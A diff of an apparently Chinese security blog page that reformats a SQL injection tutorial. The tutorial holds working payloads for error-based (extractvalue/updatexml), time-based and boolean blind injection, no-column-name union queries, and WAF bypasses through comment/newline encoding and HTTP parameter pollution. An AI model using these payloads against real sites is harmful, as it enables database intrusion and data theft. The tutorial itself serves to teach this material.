@@ -158,7 +158,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">120</span>
+          <span class="site-state-item-count">122</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -366,7 +366,7 @@ mysql_escape_string ()</p>
 <h4 id="delete-删除数据">delete 删除数据</h4>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from user where id=$id</span><br></pre></td></tr></table></figure>
 <h4 id="insert-插入数据">insert 插入数据</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user (id,name,pass) values (1,’lihua’,’1234’)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user (id,name,pass) values(1,’lihua’,’1234’)</span><br></pre></td></tr></table></figure>
 <h4 id="update-更新数据">update 更新数据</h4>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update user set pwd=‘123’ where id=1</span><br></pre></td></tr></table></figure>
 <h3 id="报错盲注">报错盲注</h3>
@@ -375,15 +375,15 @@ mysql_escape_string ()</p>
 updatexml (XML_document, XPath_string, new_value);</p>
 <p>extractvalue (): 从目标 XML 中返回包含所查询值的字符串<br>
 extractvalue (XML_document, Xpath_string);</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc’ union select 1,extractvalue (1, concat (0x7e, (select version ()), 0x7e))#</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,extractvalue (1,concat (0x7e, (select table_name from information_schema.tables where table_schema=database () limit 0,1),0x7e))#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc’ union select 1,extractvalue(1, concat(0x7e, (select version()), 0x7e))#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e))#</span><br></pre></td></tr></table></figure>
 <p>注：limit 0,1: 从 0 开始取 1 个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,updatexml (1,concat (0x7e, (select version ()),0x7e),123)#</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml (1,concat (0x7e, (select version ()),0x7e),123)#</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml (1,concat (0x7e, (select version ()),0x7e),123) or’</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,updatexml(1,concat(0x7e,(select version()),0x7e),123)#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml(1,concat(0x7e,(select version()),0x7e),123)#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml(1,concat(0x7e,(select version()),0x7e),123) or’</span><br></pre></td></tr></table></figure>
 <h3 id="延时盲注">延时盲注</h3>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if (database ()=‘test’,123,456);</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and sleep (if (length (database ()=8),5,0));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(database()=‘test’,123,456);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and sleep(if(length(database()=8),5,0));</span><br></pre></td></tr></table></figure>
 <p>sleep ():    休眠<br>
 if ():   分支结构<br>
 mid (a,b,c): 从 b 开始，截取 a 字符串的 c 位<br>
@@ -391,15 +391,15 @@ substr (a,b,c):  从 b 开始，截取 a 字符串的 c 个字符<br>
 left (a,b):  从左侧截取 a 的前 b 位<br>
 length ():   长度<br>
 ord=ascii ascii (x)=100: 判断 x 的 ascii 值是否为 100</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep (if (mid (database (),1,1)=116,5,0);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(if(mid(database(),1,1)=116,5,0);</span><br></pre></td></tr></table></figure>
 <h3 id="布尔盲注">布尔盲注</h3>
 <p>仅返回 True 或 False 时据此得到数据库中的信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’ and ascii (mid (database (),1,1))&gt;115</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’ and ascii(mid(database(),1,1))&gt;115</span><br></pre></td></tr></table></figure>
 <h3 id="加解密注入">加解密注入</h3>
 <p>根据传输方式进行对应的加解密。</p>
 <h3 id="无列名注入">无列名注入</h3>
 <p>已知数据库，但不知道列名 (information_schema 被禁用) 时，可以进行无列名注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users) a;</span><br><span class="line"></span><br><span class="line"># 正常情况下反引号会被过滤</span><br><span class="line">select b from (select 1,2 as b,3 union select * from users) a; # 查询第二列</span><br><span class="line"></span><br><span class="line">select concat (`2`,0x2d,`3`) from (select 1,2,3 union select * from users) a limit 1,3    #同时查询多个列</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br><span class="line"></span><br><span class="line"># 正常情况下反引号会被过滤</span><br><span class="line">select b from (select 1,2 as b,3 union select * from users)a; # 查询第二列</span><br><span class="line"></span><br><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from users)a limit 1,3    #同时查询多个列</span><br></pre></td></tr></table></figure>
 <h3 id="堆叠注入">堆叠注入</h3>
 <p>利用注入点执行下一条 SQL 语句，与 union 联合注入的区别在于可以用于执行任意语句。</p>
 <h2 id="WAF-绕过">WAF 绕过</h2>
@@ -419,7 +419,7 @@ or  ||<br>
 空格  %09, %0a, %0b, %0c, %0d, %20, %a0, (), /**/<br>
 注：%0a 是换行，也可以指代空格</p>
 <p>换行 (\N) 绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union #/*%0a select/*!1,2,3*/ —-+</span><br><span class="line">union/*//—-/*/ /*!—-+/*%0aselect/*11,database (),3*/ —+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union #/*%0a select/*!1,2,3*/ —-+</span><br><span class="line">union/*//—-/*/ /*!—-+/*%0aselect/*11,database(),3*/ —+</span><br></pre></td></tr></table></figure>
 <p>HTTP 参污染：如果 WAF 没有对多参数进行多次过滤，则只会识别其中一个</p>
 <p><img data-src="/img/msb/17374514447604.png" alt=""></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1%20union%20select%201,2,3%23*/</span><br></pre></td></tr></table></figure>
